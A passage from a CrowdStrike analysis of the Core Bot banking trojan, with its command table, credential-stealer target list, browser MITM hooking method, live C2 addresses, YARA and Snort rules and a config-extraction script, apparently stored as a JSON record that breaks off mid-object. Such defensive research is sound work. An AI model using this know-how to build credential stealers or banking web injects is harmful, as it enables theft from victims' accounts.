4d54 0d0a 1 08:52:00 GMT..\n0000140: 4361 6368 652d 436f 6e74 726f 6c3a 206e Cache-Control: n\n0000150: 6f2d 7374 6f72 652c 206e 6f2d 6361 6368 o-store, no-cach\n0000160: 652c 206d 7573 742d 7265 7661 6c69 6461 e, must-revalida\n0000170: 7465 2c20 706f 7374 2d63 6865 636b 3d30 te, post-check=0\n0000180: 2c20 7072 652d 6368 6563 6b3d 300d 0a50, pre-check=0..P\n0000190: 7261 676d 613a 206e 6f2d 6361 6368 650d ragma: no-cache.\n00001a0: 0a0d 0a36 330d 0ad9 cbe6 8b45 703a 6334 ...63......Ep:c4\n00001b0: f548 40e9 3dab 37be 0cdf b914 e9de ec44 .H@.=.7........D\n00001c0: 5031 5ba9 9446 ff51 c126 6dbe 1e6f 2e62 P1[..F.Q.&m..o.b\n00001d0: 1850 7696 3a65 7ecc f235 a28b c224 bcc8 .Pv.:e~..5...$..\n00001e0: 40b5 329c c325 3bad 7e0f d042 3d2a 9295 @.2..%;.~..B=*..\n00001f0: e098 974f eebf 1ffb e4fb 4530 ed67 f6f5 ...O......E0.g..\n0000200: b3cb d904 157a 145d 7181 0d0a 300d 0a0d .....z.]q...0...>\n\n```\nOnce decrypted, the response has the same format as a request, with the first byte containing\nthe identifier and the following bytes containing data structures dependent on that ID. IDs in the\nC2 responses are used by Core Bot to determine what commands to execute. Possible values are\nlisted in the next section.\n\n##### Capability\n\nCore Bot is a modular tool with most of its capability coming from its plugins. During the\nanalysis, two plugins were observed being used by Core Bot:\n\n1. A plugin for performing credential theft.\n\n2. A MITM plugin responsible for hijacking a user’s browser and performing modifications\n\nprimarily to target banking web sites.\n\nCore Bot will download plugins provided by the C2 server. Once downloaded, the plugins are\nexecuted and can optionally be installed permanently. All downloaded plugins for Core Bot are\nDLL files that Core Bot loads by allocating a new section of memory, fixing the relocations and\n\nCopyright 2016\n\n\n20\n\n\n-----\n\nimports itself, and parsing the DLL exports section before calling the required initialization\nfunction by name. All plugin DLLs export the functions:\n\n  - `PluginInit()`\n\n  - `PluginUninit()`\n\nThe PluginInit() function is used to start executing the plugin’s capability. The\n```\nPluginUninit() function is used to halt execution. If the C2 specified that the plugins should\n\n```\nbe installed permanently, they are encrypted using AES and a 256-bit key generated based on\nthe volume serial number. The encrypted files are stored in Core Bot’s working directory that is\nchecked when Core Bot initializes.\n\n###### Commands\n\nIn addition to the capability provided by plugins, Core Bot enables the adversary to task the\nmain module with a number of commands, as follows:\n\n**ID** **DESCRIPTION**\n`0x1` Modify the interval time in the configuration file with the specified value in seconds.\nThe interval represents how often the bot will beacon for commands.\n`0x3` Download the executable from the specified URL and save the file to %TEMP% with a\ntemporary file name prefixed with _ using the Window API function\n```\n    GetTempFileName(). Once downloaded, the file will be executed as a new\n\n```\nprocess.\n`0x7` Enumerate the list of processes running on the victim system and send the process\nIDs and process names to the C2 server.\n`0x8` Take a screenshot of the victim system and send it to the C2 server.\n`0xA` Add a list of URLs delimited using ; to the configuration file. These will act as backup servers and will only be used if the current C2 no longer resolves.\n`0xB` Check that the specified URL is valid by initiating a C2 protocol run with it. If it\ncompletes it correctly, add it to the configuration data.\n`0xD` Extract all items from the current configuration data and send them to the C2.\n`0xF` Update the configuration data with an arbitrary item. The provided key is used to\nadd the value specified. This can be used to both append or to overwrite existing\nitems.\n`0x10` Update the configuration data, removing the specified item.\n`0x14` Download a new instance of Core Bot, checking that the downloaded version is later\nthan the currently executing version. Launch the new instance and terminate the\ncurrent process. No persistence mechanism is installed using this command.\n`0x15` Download a new instance of Core Bot and update its ASEP. Remove the old\npersistence mechanism and install a new one using the registry key\n```\n    HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run and a value\n\n```\ngenerated based on the volume serial number of the disk formatted as %08x-%04x```\n    %04x-%02x%02x-%02x%02x%02x%02x%02x%02x with the data being the path to\n\n```\nthe downloaded executable.\n`0x16` Restart the current instance of core bot by executing a new instance and terminating\n\nCopyright 2016\n\n|ID|DESCRIPTION|\n|---|---|\n|0x1|Modify the interval time in the configuration file with the specified value in seconds. The interval represents how often the bot will beacon for commands.|\n|0x3|Download the executable from the specified URL and save the file to %TEMP% with a temporary file name prefixed with _ using the Window API function GetTempFileName(). Once downloaded, the file will be executed as a new process.|\n|0x7|Enumerate the list of processes running on the victim system and send the process IDs and process names to the C2 server.|\n|0x8|Take a screenshot of the victim system and send it to the C2 server.|\n|0xA|Add a list of URLs delimited using ; to the configuration file. These will act as back- up servers and will only be used if the current C2 no longer resolves.|\n|0xB|Check that the specified URL is valid by initiating a C2 protocol run with it. If it completes it correctly, add it to the configuration data.|\n|0xD|Extract all items from the current configuration data and send them to the C2.|\n|0xF|Update the configuration data with an arbitrary item. The provided key is used to add the value specified. This can be used to both append or to overwrite existing items.|\n|0x10|Update the configuration data, removing the specified item.|\n|0x14|Download a new instance of Core Bot, checking that the downloaded version is later than the currently executing version. Launch the new instance and terminate the current process. No persistence mechanism is installed using this command.|\n|0x15|Download a new instance of Core Bot and update its ASEP. Remove the old persistence mechanism and install a new one using the registry key HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run and a value generated based on the volume serial number of the disk formatted as %08x-%04x- %04x-%02x%02x-%02x%02x%02x%02x%02x%02x with the data being the path to the downloaded executable.|\n|0x16|Restart the current instance of core bot by executing a new instance and terminating|\n\n\n21\n\n\n-----\n\n|Col1|the current process.|\n|---|---|\n|0x19|Download the specified plugin by name, then install it by executing the PluginInit function exported by Core Bot plugin DLL files. The file is stored on the victim disk encrypted using AES and a key generated based on the volume serial ID.|\n|0x1A|Find the specified plugin by name and, if found, uninstall by executing the PluginUninit function exported by Core Bot plugin DLL files, then delete the file from disk.|\n|0x1B|Return a list of all installed plugins providing their name, version number, and debug information. The debug information provided is verbose, suggesting the bot is still in a stage of ongoing redevelopment.|\n|0x1C|Download the specified plugin to update the current installation of that module. First the name, version, and SHA1 hash of the currently installed plugin are checked. If the download is newer, the uninstall routine in command 0x1A is executed before installing the new plugin using the routine from command 0x19.|\n|0x1D|Remove all plugins from the victim system. If the value for cmd.skip_unload is set to 1, the files are deleted without first unloading them, else they are unloaded using the export PluginUninit. If unload was skipped or the value for cmd.restart is set to 1, a new instance of Core Bot will be executed and the current process terminated.|\n|0x1E|Stop the specified plugin by executing its PluginUninit function but do not remove the file from disk so when the bot restarts, the plugin will be reloaded.|\n|0x1F|Start a previously stopped plugin by executing the PluginInit function. If it has not been previously installed, an error message is returned.|\n|0x3D|Attempt to overwrite the 512 bytes of the MBR with zeros using a handle to the \\\\.\\PhysicalDrive0 object. This is a common command seen in commodity families referred to as kill OS, however it is rarely effective, as from Windows Vista onward systems do not allow non-kernel mode code to write directly to PhysicalDrive0.|\n|0x3E|Attempt to force reboot of the victim operating system using the ExitWindowEx() API.|\n|0x3F|Execute a batch script by obtaining the path to the command prompt using the environmental variable %COMSPEC%. The commands are executed and output is retrieved using pipes. Any output of running the command is returned to the C2 server.|\n|0x40|Execute an arbitrary Powershell script from the C2. Two temporary files are created in the %TEMP% directory using GetTempFileName() and the prefix ps_. One of the files is given the extension .ps1 and the downloaded script is saved into this file. It is executed using the parameters -NonInteractive -NoProfile -NoLogo - ExecutionPolicy Unrestricted to ensure it is as stealthy as possible. The output is piped into the second file that is then read and sent back to the C2 before both files are deleted.|\n|0xF4|Perform a ping back to the C2 with the text echoooou!!!!!!!!11111111111111111.|\n\n\n###### Table 4. Commands Available to Core Bot\n\n\n22\n\n\nCopyright 2016\n\n\n-----\n\nIt is interesting to note that not all codes are sequential, suggesting future command\nextensibility or variants with alternative command IDs.\n\n###### Credential Theft Plugin\n\nThe credential theft plugin targets credentials in a wide selection of different products, including\nFile Transfer Protocol (FTP) clients, email clients, web browsers, and virtual currency wallets.\n\nThe most recently observed stealer plugin has an internal name of stealer.dll and a version\nnumber of 1.6.1 given by the C2 server response containing the plugin download.\n\nThe plugin exports functionality for Core Bot to execute a thread for credential theft. Once\nexecuted, the thread creates a data stream in memory using the API function\n```\nCreateStreamOnHGlobal(). The thread then executes all of its credential searching\n\n```\nfunctionality utilizing file and registry stores to extract the credentials and save them to the data\nstream. Once complete, the following takes place:\n\n1. A 32-byte key is randomly generated using the rand() function.\n\n2. A CRC32 checksum of the data is generated before it is encrypted.\n\n3. The data stream is encrypted using the RC4 algorithm and the randomly generated key.\n\n4. The data stream is appended to the key and exported back to the Core Bot main module\n\nto be sent back to the C2 server.\n\n5. Depending on instruction from the C2, the data may optionally be compressed using the\n\nZLIB compression library with the maximum compression setting.\n\nThe thread will exit once the data is sent back to the C2 server.\n\nThe credential collection code appears to be based on the leaked source code of the commodity\nmalware Pony Loader, also known as Fareit[8]. This code has been used by other families like\n_Neverquest, also known as Vawtrak, and likely by others. Below is a full listing of the_\napplications targeted by the plugin:\n\n###### FTP Clients and File managers\n```\n32bit FTP FileZilla Notepad++\n3D-FTP FireFTP NovaFTP\nAceFTP Fling FTP Odin Secure FTP\nAdobe Dreamweaver Fresh FTP Putty\nALFTP FTP Commander Robo-FTP\nAutoFTP Manager FTP Control SecureFX\nBitKinex FTP Disk SmartFTP\nBlazeFTP FTP Now SoftX FTP Client\nBlueZoneFTP FTP++ Total Commander\nClassicFTP FTPGetter TurboFTP\nCoffeeCup Software FTPInfo UltraFXP\nCoreFTP FTPRush WebDrive\n\n```\n8 https://github.com/malwarezone/pony_1_9\n\nCopyright 2016\n\n\n23\n\n\n-----\n\n```\nCuteFTP FTPShell WebSite Publisher\nCyberduck FTPVoyager WinFrigate\nDeluxeFTP Global Downloader WinFTP\nDirectory Opus GoFTP WinSCP\nEasy FTP LeapFTP WinZiP\nEMFTP LeechFTP Wise FTP\nExpanDrive LinasFTP WS_FTP\nFAR Manager MyFTP XFTP\nFastTrack FTP NetDrive\nFFFTP NexusFile\n\n###### Email Clients\nBecky! Outlook Thunderbird\nGaiaEmail Pocomail Windows Live Mail\nIncrediMail The Bat!\n\n Web Browsers\nOpera Internet Explorer Nichrome\nComodo K_Meleon RockMelt\nEpic Privacy Browser Mozilla Firefox Safari\nFastStone Browser Mozilla Flock Yandex\nGoogle Chrome Mozilla SeaMonkey\n\n Virtual Currency Wallets\nAnonCoin Franko NameCoin\nBBQCoin FreiCoin NovaCoin\nBitCoin GoldCoin PheonixCoin\nBitCoin Armory InfiniteCoin PPCoin\nByteCoin IOCOin PrimeCoin\nCraftCoin IXCoin ProtoShares\nDevCoin JunkCoin QuarkCoin\nDigitalCoin LiteCoin TagCoin\nElectrum LuckyCoin TeraCoin\nFastCoin MegaCoin WorldCoin\nFeatherCoin MinCoin YaCoin\nFlorinCoin MultiBit ZetaCoin\n\n Other\n\n```\n  - Google Talk credentials\n\n  - Remote Desktop Protocol (RDP) connection credentials stored in .RDP files\n\n  - Users’ private key certificates stored in the local certificate store\n\n###### Man-In-The-Middle Plugin\n\nThe Man-In-The-Middle (MITM) plugin is used for intercepting web browser activity with the\nprimary goal of financial gain through access to banking credentials and through modifying\nonline banking pages accessed by the victim. The MITM plugin can intercept browser\ncommunications and modify data in both requests and responses. This enables the adversary to:\n\nCopyright 2016\n\n\n24\n\n\n-----\n\n  - Collect credentials from login page of online services\n\n  - Collect financial form data such as credit card details\n\n  - Modify browser sessions such as online banking transactions to steal money from\naccounts, for example\n\nThe most recently observed MITM plugin has an internal name of m32.dll for the 32 bit variant\nand m64.dll for the 64 variant, both with a version number of 1.0.249. They employ different\nvariants per platform, as the DLL must be injected into running processes and the architecture\nmust match the one of the target process for successful injection.\n\n###### Configuration\n\nThe Core Bot MITM plugin determines what URLs to target and how to target them based on a\nconfiguration file received from the Core Bot C2 server. Once the MITM plugin is installed, when\nCore Bot beacons to its C2, if a new MITM configuration file is available it will download and\ndecrypt it using the standard C2 protocol.\n\nThe MITM configuration file is a binary structure and contains the following elements:\n\n  - A list of attacker-controlled servers for grabbing tokens from online banking\ntransactions. Tokens are used when authenticating bank transfers, and the adversary\nuses token grabber services for defeating two-factor authentication systems put in place\nby the bank.\n\n  - A list of URLs to target for credential collection.\n\n  - A list of URLs to target for script injection. Additional scripts are then downloaded and\nused to deceive victims into entering additional security details when logging in to\nonline banking accounts.\n\n  - Additional scripts for injecting into targeted URLs. The scripts are generally stubs that\ndownload further script resources, both attacker-controlled URLs and legitimate\nwebsites.\n\nExamples of this are given in the Targeting section at the beginning of this report.\n\n###### Implementation\n\nThe MITM plugin uses a different technique than other banking Trojans such as Zeus[9] and\nDridex[10] that rely on hooking HTTP functions in a browser. Instead, Core Bot MITM establishes a\nlocal proxy for intercepting browser traffic—a method also observed in Hesperbot.[11] The process\nit follows is:\n\n1. The Core Bot main module ensures the MITM plugin is loaded into all user processes\n\nusing WriteProcessMemory() and CreateRemoteThread() APIs to inject its code.\n\n9  http://www.ioactive.com/pdfs/ZeusSpyEyeBankingTrojanAnalysis.pdf\n10 Reference to CrowdStrike Intelligence reporting\n11 http://www.welivesecurity.com/wp-content/uploads/2013/09/Hesperbot_Whitepaper.pdf\n\nCopyright 2016\n\n\n25\n\n\n-----\n\n2. The plugin instance running in Core Bot’s primary svchost.exe process binds to the\n\nloopback address 127.0.0.1 and the hard-coded port 8080/tcp.\n\n3. Once bound, a new self-signed private key certificate is generated and added to the\n\ncertificate store to enable it to service incoming HTTPS requests.\n\n4. A new thread is created for each incoming proxy connection. The thread parses the data\n\nbased on the configuration file, carries out the required actions, and forwards the data\nto its original destination.\n\n5. If the plugin determines it is running in a browser, it uses inline hooks to modify\n\nconnection functions, ensuring data is sent to the locally configured listener.\n\n6. To ensure HTTPS connections do not flag interception errors to the victim, a further set\n\nof function modifications and inline hooks are used to bypass checks for self-signed\ncertificates.\n\nThe MITM plugin targets processes by the following names:\n\n  - `firefox.exe`\n\n  - `chrome.exe`\n\n  - `iexplore.exe`\n\n  - `MicrosoftEdgeCP.exe`\n\nTo ensure that all connections are sent via the MITM proxy, inline hooks are set in the following\nfunctions in targeted browser processes:\n\n  - `ws2_32.dll:send()`\n\n  - `ws2_32.dll:WSASend()`\n\n  - `ws2_32.dll:connect()`\n\n  - `ws2_32.dll:WSAConnect()`\n\n  - `ws2_32.dll:closesocket()`\n\n  - `ws2_32.dll:WSAConnectByNameA()`\n\n  - `ws2_32.dll:WSAConnectByNameW()`\n\n  - `ws2_32.dll:WSAConnectByList()`\n\nCore Bot would not actually need to hook the closesocket() and send() functions in order\nto intercept a connection. The bot hooks these functions in order to track sockets and gather\nmetadata about the process sending the data such as the process ID that could not be obtained\nvia the proxy. This data is communicated from the instance running in the browser process to\nthe main instance using a named pipe \\\\.\\pipe\\io_serv.\n\nTo ensure that certificate errors do not get flagged to the user, the following functions are\neither hooked or modified:\n\n  - `wintrust.dll:WinVerifyTrust()`\n\n  - `crypt.dll:CertVerifyCertificateChainPolicy()`\n\nCopyright 2016\n\n\n26\n\n\n-----\n\n  - `crypt.dll:CertGetCertificateChain()`\n\n  - `nss3.dll:CERT_CertChainFromCert()`\n\nCopyright 2016\n\n\n27\n\n\n-----\n\n28\n\nCopyright 2016\n\n\n-----\n\n### MITIGATION & REMEDIATION\n\nCore Bot leaves various traces on infected hosts that can be used to identify compromised\nmachines. Additionally, characteristic patterns in the C2 communication can be leveraged to\nspot infections through inspection of network traffic. This section provides a list of respective\nindicators and signatures.\n\n#### HOST INDICATORS\n\nFollowing is a list of example files for a Core Bot variant. These files serve only as a reference;\nnew versions are deployed on a regular basis, which makes it impossible to provide a complete\nlist of indicators.\n\n**File: Court_Notification_000475583.doc.js**\n\n**MD5 Hash: b966c49850777e84eac37596ee3c7315**\n\n**File: Key67k300OXTs1.exe**\n\n**MD5 Hash: f10560e3d25e5045e44fd997e2fec10c**\n\n**Build Time: 2015-10-15 07:35:57 UTC**\n\n**File: stealer.dll**\n\n**MD5 Hash: ac3c8683b7683021b079c4e9a627dd08**\n\n**Build Time: 2015-08-19 12:33:41 UTC**\n\n**File: mk1.dll**\n\n**MD5 Hash: 9b2d1892375084826c345d35db5f578d**\n\n**Build Time: 2015-09-23 12:53:559 UTC**\n\nAdditionally, the following generic host artifacts indicate a compromise by Core Bot.\n\n##### Files\n\n  - Two sub directories in the path %LOCALAPPDATA%\\Microsoft\\ with names matching\nthe regular expression [0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}```\n    [0-9a-f]{12}.\n\n```\n  - One subdirectory containing an executable with a name matching the regular\nexpression [0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a```\n    f]{12}.exe.\n\n```\n  - The other subdirectory containing a number of similar files and directories with names\nmatching the regular expression [0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0```\n    9a-f]{4}-[0-9a-f]{12}.\n\n```\nCopyright 2016\n\n\n29\n\n\n-----\n\n##### Registry Values\n\n  - Value matching the regular expression [0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}```\n    [0-9a-f]{4}-[0-9a-f]{12} with data pointing to the executable file described\n\n```\nabove under the registry key\n```\n    HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run.\n\n##### Objects\n\n```\nThe named pipe:\n\n  - `\\\\.\\core_ps`\n\nIf the MITM plugin is installed, the named pipes:\n\n  - `\\\\.\\pipe\\bitbltserv`\n\n  - `\\\\.\\pipe\\io_serv`\n\nThe mutexes:\n\n  - `::62DFDF4F-C9F7-4416-9688-41C7791D0C33`\n\n  - `{F4EE296B-9B08-4B04-8443-7E76A45FE740}`\n\n##### YARA Rules\n\nThe following YARA rules will detect unpacked versions of the loader and main module, as well\nas decrypted plugins. Since files on disk are either packed or encrypted, these rules are most\neffective on memory dumps or active processes.\n```\nrule CrowdStrike_BOSON_SPIDER_01 : corebot_debug_loader\n{\n  meta:\n    copyright = \"CrowdStrike Inc\"\n    description= \"PDB strings included in Memory dump of Core Bot\nloader\"\n    version = \"1.1\"\n    last_modified = \"2015-11-26\"\n    in_the_wild = \"true\"\n  strings:\n    $x86 = \"C:\\\\work\\\\itco\\\\core\\\\bin\\\\x86\\\\Release\\\\loader.pdb\"\n    $x64 = \"C:\\\\work\\\\itco\\\\core\\\\bin\\\\x64\\\\Release\\\\loader.pdb\"\n  condition:\n    1 of them\n}\nrule CrowdStrike_BOSON_SPIDER_02: corebot_debug_main\n{\n  meta:\n    copyright = \"CrowdStrike Inc\"\n    description= \"PDB strings included in Memory dump of Core Bot\nMain\"\n\n```\nCopyright 2016\n\n\n30\n\n\n-----\n\n```\n    version = \"1.1\"\n    last_modified = \"2015-11-26\"\n    in_the_wild = \"true\"\n  strings:\n    $x86 = \"C:\\\\work\\\\itco\\\\core\\\\bin\\\\x86\\\\Release\\\\core.pdb\"\n    $x64 = \"C:\\\\work\\\\itco\\\\core\\\\bin\\\\x64\\\\Release\\\\core.pdb\"\n  condition:\n    1 of them\n}\nrule CrowdStrike_BOSON_SPIDER_03 : corebot_main\n{\n  meta:\n    copyright = \"CrowdStrike Inc\"\n    description= \"String found in Core Bot Main module\"\n    version = \"1.0\"\n    last_modified = \"2015-11-26\"\n    in_the_wild = \"true\"\n   strings:\n    $guid = \"%08x-%04x-%04x-%02x%02x-%02x%02x%02x%02x%02x%02x\"\n    $params = \".params\"\n    $init = \"PluginInit\"\n    $uninit = \"PluginUninit\"\n    $stop = \"._stopped\"\n    $mutex = \"62DFDF4F-C9F7-4416-9688-41C7791D0C33\"\n    $workdir = \"core.work_dir\"\n   condition:\n    4 of them\n}\nrule CrowdStrike_BOSON_SPIDER_04: corebot_plugin_generic\n{\n  meta:\n    copyright = \"CrowdStrike Inc\"\n    description= \"Core Bot Plugin Generic Detecetion\"\n    version = \"1.0\"\n    last_modified = \"2015-11-26\"\n    in_the_wild = \"true\"\n  strings:\n    //PluginInit,0,PluginUninit,0\n    $init = {50 6C 75 67 69 6E 49 6E 69 74 00 50 6C 75 67 69 6E 55\n6E 69 6E 69 74 00}\n  condition:\n    all of them\n}\nrule CrowdStrike_BOSON_SPIDER_05 : corebot_plugin_stealer\n\n```\nCopyright 2016\n\n\n31\n\n\n-----\n\n```\n{\n  meta:\n    copyright = \"CrowdStrike Inc\"\n    description= \"Core Bot Stealer Plugin\"\n    version = \"1.0\"\n    last_modified = \"2015-11-26\"\n    in_the_wild = \"true\"\n  strings:\n    $format = \"%8X-%4hX-%4hX-%2hX%2hX-%2hX%2hX%2hX%2hX%2hX%2hX\"\n    $firefox = \"stealer.firefox\"\n    $done = \"stealer.done\"\n    $outlook = \"outlook account manager passwords\" wide\n    $mozilla = \"@mozilla.org/security/x509certdb;1\"\n    $cuteftp = \"Software\\\\GlobalSCAPE\\\\CuteFTP\" wide\n  condition:\n    4 of them\n}\nrule CrowdStrike_BOSON_SPIDER_06 : corebot_plugin_mitm\n{\n  meta:\n    copyright = \"CrowdStrike Inc\"\n    description= \"Core Bot MITM Web Inject Plugin\"\n    version = \"1.0\"\n    last_modified = \"2015-11-26\"\n    in_the_wild = \"true\"\n  strings:\n    $mitmname = \"mitm.conf_name\"\n    $workdir = \"core.work_dir\"\n    $botnet = \"%BOTNET%\"\n    $sessid = \"%%sess_id%%\"\n    $edge = \"MicrosoftEdgeCP.exe\" wide\n    $injformat = \"injected to pid: %d, name: %s, version: %s\"\n  condition:\n    4 of them\n}\n\n#### NETWORK INDICATORS\n\n```\nThe following C2 hosts were observed during the analysis of Core Bot:\n\n  - `http://193.28.179.22/client`\n\n  - `http://89.144.2.127/client`\n\n  - `http://gridismind.com/client/`\n\n  - `http://pasteronixca.com/client/`\n\n  - `http://balktrove.net/gate/`\n\nCopyright 2016\n\n\n32\n\n\n-----\n\n  - `http://haloadoxy.com/gate`\n\n  - `http://kustitoop.com/gate`\n\n  - `http://lucidspung.com/gate/`\n\n  - `http://luraidite.com/gate/`\n\n  - `http://pomppondy.net/gate/`\n\n  - `http://rasaictus.com/gate/`\n\n  - `http://solidkaik.com/gate/`\n\n  - `http://swashsepal.com/gate/`\n\n  - `http://toadpasso.com/gate/`\n\n  - `http://tychebruke.com/gate/`\n\n##### Snort Rules\n\nThe following Snort rule will detect a generic Core Bot beacon.\n```\nalert tcp $HOME_NET any -> $EXTERNAL_NET $HTTP_PORTS (\\\n msg:\"CrowdStrike Core Bot Beacon\"; \\\n flow: established, to_server; \\\n content: \"POST\"; http_method; \\\n content: \"User-Agent|3a| Mozilla/5.0 (compatible|3b| MSIE 10.0|3b|\nWindows NT 6.1|3b| WOW64|3b| Trident/6.0)\"; http_header; \\ \n content: \"no-cache|0d0a0d0a4151414141|\"; fast_pattern; offset:128;\ndepth:512; \\\n classtype: trojan-activity; metadata: service http; \\\n sid: 181600401; rev: 20160413;)\n\n#### TACTICS, TECHNIQUES, AND PROCEDURES\n\n```\n  - Deployment via exploit kits and spam runs using JavaScript attachments to download\nand install payloads.\n\n  - Ever-changing use of infrastructure including changing IPs and domains, as well as a\nbackup DGA.\n\n  - Use of modular payloads, likely controlled entirely by a single group with only a small\nnumber of affiliates.\n\n  - Opportunistic targeting of general credentials and targeting of American, Canadian, and\nEast Asian financial institutes for monetization.\n\nCopyright 2016\n\n\n33\n\n\n-----\n\n34\n\nCopyright 2016\n\n\n-----\n\n### CONCLUSION\n\nCore Bot is a modular and extensible implant that is still in active development. It is likely\ncontrolled and developed by a single group with a small number of affiliates and (based on links\nin its deployment, targeting, and infrastructure) is likely to be a group of individuals based in\nEastern Europe or Russia.\n\nThe group monetizes their infections through generic credential theft and more recently via\nattacks on victims’ bank accounts using MITM attacks to intercept online transactions and\ndefeat two-factor authentication to acquire funds. Targeting initially focused on the U.S. and\nCanada, then expanding to Hong Kong, Singapore, and East Asia before most recently including\nJapanese banks. It is likely the group focuses on a single area at a time or rents their service to\ninterested parties as affiliates. In the case of the latter, the number of affiliates would be very\nsmall.\n\nCore Bot is modular in design and closed source; it does not appear to be based on leaked code\nor previous banking Trojans, suggesting an above-average level of sophistication by the\nadversary. It is likely due to the low penetration that the same group is both running and\ndeveloping it, and that very few (if any) affiliates are using the service. Core Bot is being\ndistributed using known criminal services such as spam runs containing JavaScript downloaders\nand exploits kits such as Angler.\n\nAlthough distribution of Core Bot is fairly low, its capabilities and active code development\nmean it could become a much larger threat in the future should it start being rented out to a\ngreater number of affiliates or being sold in the underground marketplace.\n\nCopyright 2016\n\n\n35\n\n\n-----\n\n<over an infected machine.\n\n36\n\nCopyright 2016\n\n\n-----\n\n### APPENDIX\n\nThe following script can be used to extract the initial configuration from a Core Bot main\nmodule:\n```\nfrom struct import unpack\nfrom Crypto.Cipher import ARC4\nimport pefile\n#------------------------------------#Determine the memory alignment and extract section\ndef find_section(self,secname,indata):\n    pe = pefile.PE(data=indata)\n    textsec = 0\n    sect = 0\n    sectsz = 0\n    for section in pe.sections:\n       if section.Name[0:5] == \".text\":        \n           textsec = section.PointerToRawData\n    if indata[textsec:textsec+8] ==\n\"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\":\n       for section in pe.sections:\n           if section.Name[0:len(secname)] == secname:        \n               sect = section.VirtualAddress\n               sectsz = section.SizeOfRawData\n    else:\n       for section in pe.sections:\n           if section.Name[0:len(secname)] == secname:        \n               sect = section.PointerToRawData\n               sectsz = section.SizeOfRawData\n    return indata[sect:sect+sectsz]\n#------------------------------------key =\n\"\\x0A\\xA2\\xAA\\x50\\xE9\\x4C\\xA8\\x41\\x98\\x81\\x76\\x0D\\x12\\xA6\\x1B\\x54\\x79\\x\n26\\xE6\\x1F\\x77\\x85\\x06\\xF1\\x9E\\x6D\\xB0\\x42\\xFF\\xF3\\x29\\x14\"\nparams = self.find_section(\".params\",indata)\nrc = ARC4.new(key)\nconfig = rc.decrypt(params)\n\n```\n37\n\nCopyright 2016\n\n\n-----\n\n# ABOUT CROWDSTRIKE\n\nCrowdStrike is the leader in next-generation endpoint protection,\n\nthreat intelligence and response services. CrowdStrike’s core\ntechnology, the Falcon Platform, stops breaches by preventing and\nresponding to all types of attacks – both malware and malware-free.\n\nCrowdstrike is the only security technology provider to unify into a\nsingle agent next-generation antivirus along with endpoint detection\nand response, backed by 24/7 proactive threat hunting – all delivered\n\nvia the cloud. Falcon uses the patent-pending CrowdStrike Threat\n\nGraph™ to analyze and correlate billions of events in real time,\n\nproviding complete protection and five-second\n\nvisibility across all endpoints.\n\nMany of the world’s largest organizations already put their trust in\n\nCrowdStrike, including three of the 10 largest global companies by\nrevenue, five of the 10 largest financial institutions, three of the top 10\n\nhealth care providers, and three of the top 10 energy companies.\nCrowdStrike Falcon is currently deployed in more than 170 countries.\n\n##### We Stop Breaches. Learn more: www.crowdstrike.com\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "6fc23d14-23a6-4870-8fad-b291b182596f",
            "created_at": "2022-10-25T16:07:18.480113Z",
            "updated_at": "2022-10-25T16:07:18.480113Z",
            "deleted_at": null,
            "name": "ETDA",
            "url": "https://apt.etda.or.th",
            "description": "Threat Group Cards: A Threat Actor Encyclopedia",
            "reports": null
        },
        {
            "id": "bf5be533-fa31-4590-ae37-5761c97ffa34",
            "created_at": "2022-10-25T16:13:58.389257Z",
            "updated_at": "2022-10-25T16:13:58.389257Z",
            "deleted_at": null,
            "name": "Malpedia",
            "url": "https://malpedia.caad.fkie.fraunhofer.de",
            "description": "Malpedia is a free service offered by Fraunhofer FKIE",
            "reports": null
        },
        {
            "id": "99593a68-7f6e-400e-9a9f-a707f66d2e72",
            "created_at": "2022-11-23T11:07:14.353321Z",
            "updated_at": "2022-11-23T11:07:14.353321Z",
            "deleted_at": null,
            "name": "AGRO",
            "url": "https://apt.threattracking.com",
            "description": "APT Groups and Operations Spreadsheet",
            "reports": null
        },
        {
            "id": "6825b8cb-7d82-43d2-b0b0-d51c7e255b42",
            "created_at": "2023-01-06T13:46:37.642134Z",
            "updated_at": "2023-01-06T13:46:37.642134Z",
            "deleted_at": null,
            "name": "MISPGALAXY",
            "url": "https://www.misp-project.org/galaxy.html",
            "description": "MISP Galaxy Clusters",
            "reports": null
        }
    ],
    "references": [
        "https://go.crowdstrike.com/rs/281-OBQ-266/images/Report_BosonSpider.pdf"
    ],
    "report_names": [
        "Report_BosonSpider.pdf"
    ],
    "threat_actors": [
        {
            "id": "bc289ba8-bc61-474c-8462-a3f7179d97bb",
            "created_at": "2022-10-25T16:07:24.450609Z",
            "updated_at": "2025-03-27T02:02:10.235933Z",
            "deleted_at": null,
            "main_name": "Avalanche",
            "aliases": [],
            "source_name": "ETDA:Avalanche",
            "tools": [],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "a95ead6e-d506-4929-a0dd-1a7afb19b84e",
            "created_at": "2022-10-25T16:07:24.461901Z",
            "updated_at": "2025-03-27T02:02:10.239942Z",
            "deleted_at": null,
            "main_name": "Boson Spider",
            "aliases": [],
            "source_name": "ETDA:Boson Spider",
            "tools": [
                "CoreBot"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "aa73cd6a-868c-4ae4-a5b2-7cb2c5ad1e9d",
            "created_at": "2022-10-25T16:07:24.139848Z",
            "updated_at": "2025-03-27T02:02:10.120505Z",
            "deleted_at": null,
            "main_name": "Safe",
            "aliases": [],
            "source_name": "ETDA:Safe",
            "tools": [
                "DebugView",
                "LZ77",
                "OpenDoc",
                "SafeDisk",
                "TypeConfig",
                "UPXShell",
                "UsbDoc",
                "UsbExe"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "ab35254c-b3f8-4b45-9413-01591ba7b5f4",
            "created_at": "2023-01-06T13:46:39.231425Z",
            "updated_at": "2025-03-27T02:00:03.026773Z",
            "deleted_at": null,
            "main_name": "BOSON SPIDER",
            "aliases": [],
            "source_name": "MISPGALAXY:BOSON SPIDER",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
